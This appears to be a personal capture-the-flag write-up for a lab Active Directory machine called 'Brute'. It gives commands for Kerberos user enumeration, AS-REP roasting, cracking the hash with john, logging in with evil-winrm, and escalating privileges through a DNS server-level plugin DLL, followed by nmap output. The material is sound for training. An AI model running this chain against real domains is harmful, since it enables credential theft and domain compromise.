---
tags: [AD, Challenge, Video]
title: Brute
created: '2020-10-01T16:49:24.034Z'
modified: '2020-10-02T17:43:24.127Z'
---

# Brute
- IP: `172.31.3.3`
- OS: `Active Directory`
## Enumeration
### Writeup
We try to enumerate usernames and find 4.
We perform an ASREPRoast on these names: `GetNPUsers.py -usersfile users -dc-ip 172.31.3.3 -outputfile ASREPHash BRUTE.CSL/`
We get a hash for `Tess` and crack it to `Unique1`: `john --wordlist=/usr/share/wordlists/rockyou.txt ASREPHash`
We can login to winrm: `crackmapexec winrm -u tess -p Unique1 --continue-on-success 172.31.3.3`
`evil-winrm -i 172.31.3.8 -u tess -p Unique1`

`upload plugin.dll`
`dnscmd /config /serverlevelplugindll C:\Users\Tess\Documents\plugin.dll`
`sc.exe stop dns`
`sc.exe start dns`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.3.3`
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-01 16:55:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRUTE
|   NetBIOS_Domain_Name: BRUTE
|   NetBIOS_Computer_Name: BRUTE-DC
|   DNS_Domain_Name: brute.csl
|   DNS_Computer_Name: Brute-DC.brute.csl
|   DNS_Tree_Name: brute.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2020-10-01T16:57:51+00:00
| ssl-cert: Subject: commonName=Brute-DC.brute.csl
| Issuer: commonName=Brute-DC.brute.csl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-26T20:13:21
| Not valid after:  2020-11-25T20:13:21
| MD5:   4508 b6eb 2a3d 87ff ad65 9c3e 14de 07b5
|_SHA-1: ef51 fe08 c315 ac7f 0dc5 3a22 b264 d28b 7fd4 153a
|_ssl-date: 2020-10-01T16:58:07+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
```

- `nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='BRUTE',userdb=/usr/share/wordlists/SecLists/Usernames/Names/names.txt 172.31.3.3`
```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     darleen@BRUTE
|     tess@BRUTE
|     malcolm@BRUTE
|_    patrick@BRUTE
```
</details>

<details>
<summary></summary>

- ``
```

```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
